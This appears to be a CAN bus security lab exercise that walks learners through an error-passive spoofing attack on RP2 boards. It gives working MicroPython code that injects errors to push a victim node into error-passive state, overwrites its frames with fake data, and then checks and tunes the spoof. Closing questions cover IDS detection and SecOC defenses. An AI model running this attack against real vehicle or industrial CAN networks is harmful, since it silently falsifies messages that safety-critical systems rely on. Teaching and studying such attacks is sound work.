# Challenge 8: Error Passive Spoofing — Stealth Attack
**Difficulty:** 🔴🔴 Expert | **Time:** 60 min | **Boards:** 2

## 🎯 Objective
Execute an **error passive spoof** — overwrite a target frame while the sender is in error passive mode. This is a stealth attack because the attacker's frame replaces the victim's without generating visible errors.

## 📖 Background
When a CAN node is in **error passive** mode (TEC ≥ 128), it can no longer send active error frames — it can only send passive error frames (recessive bits). An attacker can exploit this: first drive the victim to error passive, then overwrite its frames with fake data. The victim tries to transmit but the attacker's dominant bits win, and no error frame is generated because the victim is passive.

This is the **stealthiest CAN attack** — no error frames, no bus disruption, just silently replaced data.

## 🔬 Exercise

### Part A: Drive victim to error passive
**Board B — victim sending periodic frames:**
```python
from rp2 import CAN, CANFrame, CANID
from utime import sleep_ms

c = CAN()
i = 0
while True:
    f = CANFrame(CANID(0x200), data=bytes([i & 0xFF, 0x00]))
    try:
        c.send_frame(f)
    except:
        pass
    bus_off, error_passive, tec, rec = c.get_status()
    state = 'bus-off' if bus_off else 'error-passive' if error_passive else 'error-active'
    print(f"[{i}] TEC={tec} State={state}")
    if state == 'error-passive':
        print("*** NOW IN ERROR PASSIVE MODE ***")
    i += 1
    sleep_ms(100)
```

**Board A — inject errors to push victim to error passive (NOT bus-off):**
```python
from rp2 import CAN, CANHack

c = CAN(tx_open_drain=True)
ch = CANHack()

ch.set_frame(can_id=0x200, data=bytes(2))
# Inject enough errors to reach error passive (TEC=128) but NOT bus-off (256)
# Each error adds 8 to TEC, so 16 errors → TEC=128
print("Pushing victim to error passive...")
ch.error_attack(repeat=16)
print("Victim should now be error passive")
```

### Part B: Execute the error passive spoof
Once the victim is error passive, overwrite its frames:
```python
from rp2 import CAN, CANHack

c = CAN(tx_open_drain=True)
ch = CANHack()

# Set the SPOOF frame (what we want receivers to see)
fake_data = bytes([0xFF, 0xFF])  # Fake data
ch.set_frame(can_id=0x200, data=fake_data)

# Overwrite the victim's frame. This requires the target transmitter to already
# be error-passive, and exact success depends on firmware timing.
print("Executing error passive spoof...")
ch.spoof_frame(timeout=500000, overwrite=True)
print("Spoof attempt complete")
```

### Part C: Verify the spoof worked
**On a third monitoring node (or Board A in receive mode):**
```python
from rp2 import CAN
c = CAN()

print("Monitoring for spoofed frames...")
while True:
    frames = c.recv()
    for f in frames:
        if f.get_arbitration_id() == 0x200:
            data = f.get_data()
            if data == bytes([0xFF, 0xFF]):
                print(f"  SPOOFED: {data.hex()}")
            else:
                print(f"  Original: {data.hex()}")
```

### Part D: Tune the target timing
There is no loopback-offset parameter in the SDK. Repeat the overwrite attack with
different `timeout` values and record whether a replacement is observed:
```python
for offset in range(0, 200, 10):
    ch.set_frame(can_id=0x200, data=bytes([0xFF, 0xFF]))
    ch.spoof_frame(timeout=offset, overwrite=True)
    print(f"Timeout {offset}: attempt complete")
```

**Questions:**
1. Why does this attack only work when the victim is error passive?
2. Why is this stealthier than regular spoofing?
3. Could a monitoring IDS detect this attack?
4. How does the timeout affect the attack window?
5. How would SecOC (message authentication) prevent this?

## 📝 What to Share
- Whether you achieved silent frame replacement
- The timeout value that gave the most reliable replacement
- Comparison: error passive spoof vs regular spoof vs Janus
- Defense discussion: why this is the hardest attack to detect

## 🏆 Stretch
- [ ] Combine with Janus: error passive Janus spoof
- [ ] Measure how long the victim stays in error passive
- [ ] Can the victim detect it's being spoofed while error passive?
